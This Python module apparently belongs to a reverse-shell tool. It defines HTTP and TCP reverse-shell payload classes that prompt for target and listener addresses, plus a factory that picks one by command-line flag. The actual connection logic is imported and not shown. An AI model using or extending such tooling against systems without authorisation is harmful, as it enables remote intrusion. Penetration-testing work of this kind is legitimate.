"""
This module defines classes for handling reverse shell payloads and a factory to generate payload instances.

Classes:
- PayloadBase: Abstract base class for payloads.
- ReverseShellPayload: Payload for initiating a reverse shell connection.
- PayloadFactory: Factory for generating payload instances.

Keyword arguments:
argument -- description
Return: return_description
"""

import socket
from abc import ABC, abstractmethod
from payloads.reverse_http_shell import ReverseShellHTTPServerConnection
from payloads.reverse_tcp_shell import ReverseShellTCPServerConnection

class PayloadBase(ABC):
    """Base class for payloads."""
    
    def __init__(self, mode):
        self.mode = mode
        self.execute_payload()

    @abstractmethod
    def execute_payload(self):
        """Abstract method for executing the payload."""
        pass

    def is_ip_valid(self, ip):
            """Check if the provided IP address is valid."""
            try:
                socket.inet_pton(socket.AF_INET, ip)
                return True
            except socket.error:
                return False
                
    def is_port_valid(self, port):
        """Check if the provided port is valid."""
        try:
            port = int(port)
            return 0 < port < 65536
        except ValueError:
            return False

class ReverseHTTPShellPayload(PayloadBase):
    """Payload for initiating a reverse http shell connection."""

    def execute_payload(self):
        """Execute the reverse http shell payload."""
        target_host = input("Target Host: ")
        target_port = input("Target Port: ")
        local_host = input("Local Host: ")
        local_port = input("Local Port: ")

        if self.is_ip_valid(target_host) and self.is_port_valid(target_port) and self.is_ip_valid(local_host) and self.is_port_valid(local_port):
            ReverseShellHTTPServerConnection(target_host=target_host, target_port=target_port, local_host=local_host, local_port=local_port, mode=self.mode)
        else:
            print("Invalid target host or port")

class ReverseTCPShellPayload(PayloadBase):
    """Payload for initiating a reverse tcp shell connection."""
        
    def execute_payload(self):
        """Execute the reverse tcp shell payload."""
        target_host = input("Target Host: ")
        target_port = input("Target Port: ")
        local_host = input("Local Host: ")
        local_port = input("Local Port: ")

        if self.is_ip_valid(target_host) and self.is_port_valid(target_port) and self.is_ip_valid(local_host) and self.is_port_valid(local_port):
            ReverseShellTCPServerConnection(target_host=target_host, target_port=target_port, local_host=local_host, local_port=local_port, mode=self.mode)
        else:
            print("Invalid target host or port")

        
class PayloadFactory:
    """Factory for generating payload instances."""
    
    payload_classes = {
        "-rev-shell": ReverseHTTPShellPayload,
        "-rev-tcp": ReverseTCPShellPayload
    }

    @staticmethod
    def generate_payload_factory(payload_type, mode="listener"):
        """Generate a payload instance based on the payload type."""
        payload_type = payload_type.lower()
        payload_class = PayloadFactory.payload_classes.get(payload_type)
        if payload_class:
            payload_instance = payload_class(mode)
            return payload_instance
        else:
            raise ValueError(f"Payload type '{payload_type}' is not recognized.")
